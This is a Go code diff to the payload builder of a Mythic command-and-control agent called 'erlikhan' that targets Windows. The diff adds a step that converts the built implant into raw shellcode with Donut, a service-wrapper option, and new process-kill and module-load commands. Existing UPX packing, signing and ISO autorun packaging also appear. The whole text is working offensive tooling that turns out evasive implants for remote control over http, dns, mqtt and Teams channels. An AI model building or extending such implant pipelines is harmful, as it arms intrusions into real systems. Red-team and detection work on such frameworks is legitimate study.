@@ -77,17 +77,18 @@ type agentConfig struct {
 }
 
 var payloadDefinition = agentstructs.PayloadType{
-	Name:                   "erlikhan",
-	FileExtension:          "exe",
-	Author:                 "erlikhan",
-	SupportedOS:            []string{agentstructs.SUPPORTED_OS_WINDOWS},
-	Wrapper:                false,
-	SupportsDynamicLoading: true,
-	Description:            "multi-profile agent (http, mqtt, dns, msteams; shell/powershell/sleep/ls/download/upload/rm/mkdir/exit; go or native C)",
-	SupportedC2Profiles:    []string{"http", "mqtt", "dns", "msteams"},
-	MythicEncryptsData:     true,
-	MessageFormat:          agentstructs.MessageFormatJSON,
-	BuildParameters:        buildParameters(),
+	Name:                                   "erlikhan",
+	FileExtension:                          "exe",
+	Author:                                 "erlikhan",
+	SupportedOS:                            []string{agentstructs.SUPPORTED_OS_WINDOWS},
+	Wrapper:                                false,
+	CanBeWrappedByTheFollowingPayloadTypes: []string{"service_wrapper"},
+	SupportsDynamicLoading:                 true,
+	Description:                            "multi-profile agent (http, mqtt, dns, msteams; shell/powershell/sleep/ls/download/upload/rm/mkdir/ps/kill/load/unload/exit; go or native C)",
+	SupportedC2Profiles:                    []string{"http", "mqtt", "dns", "msteams"},
+	MythicEncryptsData:                     true,
+	MessageFormat:                          agentstructs.MessageFormatJSON,
+	BuildParameters:                        buildParameters(),
 	BuildSteps: []agentstructs.BuildStep{
 		{Name: "Configuring", Description: "Reading C2 profile and build parameters"},
 		{Name: "Staging", Description: "Staging agent sources and assets"},
@@ -595,6 +596,11 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 			return fail("Post-processing", "pack=upx", err)
 		}
 	}
+	if opts.shellcode {
+		if err := needTool("donut"); err != nil {
+			return fail("Packaging", "shellcode=true", err)
+		}
+	}
 	if opts.sign != "none" {
 		if err := needTool("openssl"); err != nil {
 			return fail("Signing", "openssl", err)
@@ -755,7 +761,12 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 	buildStep(msg.PayloadUUID, "Signing", true, "")
 
 	artifact, filename := exe, msg.PayloadUUID+".exe"
-	if opts.packaging != "none" {
+	if opts.shellcode {
+		if err := runDonut(exe, "agent.bin", opts.arch); err != nil {
+			return fail("Packaging", "donut", err)
+		}
+		artifact, filename = "agent.bin", msg.PayloadUUID+".bin"
+	} else if opts.packaging != "none" {
 		peutils.SevenZipPassword = opts.packagePW
 		peutils.MSIAppName, peutils.MSIManufacturer, peutils.MSIScope = opts.msiApp, opts.msiMfr, opts.msiScope
 		if opts.packaging == "iso" && opts.isoAutorun {
@@ -779,6 +790,25 @@ func build(msg agentstructs.PayloadBuildMessage) agentstructs.PayloadBuildRespon
 	}
 	buildStep(msg.PayloadUUID, "Reporting back", true, "")
 	return resp
+}
+
+// donutArch maps the build arch to Donut's -a flag (1=x86, 2=amd64).
+func donutArch(arch string) string {
+	if arch == "x86" {
+		return "1"
+	}
+	return "2"
+}
+
+// runDonut converts the built EXE to raw position-independent shellcode.
+func runDonut(exe, out, arch string) error {
+	var stderr bytes.Buffer
+	cmd := exec.Command("donut", "-i", exe, "-o", out, "-a", donutArch(arch), "-f", "1")
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		return fmt.Errorf("%s: %w", strings.TrimSpace(stderr.String()), err)
+	}
+	return nil
 }
 
 func checkPackageTools(format string) error {
@@ -807,5 +837,6 @@ func checkPackageTools(format string) error {
 func Initialize() {
 	agentstructs.AllPayloadData.Get("erlikhan").AddPayloadDefinition(payloadDefinition)
 	agentstructs.AllPayloadData.Get("erlikhan").AddBuildFunction(build)
+	agentstructs.AllPayloadData.Get("erlikhan").AddOnNewCallbackFunction(onNewCallback)
 	agentstructs.AllPayloadData.Get("erlikhan").AddIcon(filepath.Join(".", "erlikhan.svg"))
 }
